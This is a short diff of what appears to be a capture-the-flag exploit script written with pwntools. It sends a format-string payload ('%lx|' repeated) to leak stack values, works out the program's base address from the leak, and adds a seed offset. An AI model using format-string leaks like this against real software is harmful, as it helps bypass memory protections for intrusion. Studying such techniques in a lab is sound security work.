@@ -9,9 +9,9 @@ p.sendlineafter(': ', '%lx|'*11)
 offset_bss = 0x1750
 addr_base_bss = int(p.recvrepeat(1).split('|')[10], 16) - offset_bss
 
-log.info('base: ' + hex(addr_base_bss))
+log.info('base_bss: ' + hex(addr_base_bss))
 
-
+offset_seed = 0x5008
 
 p.interactive()
 
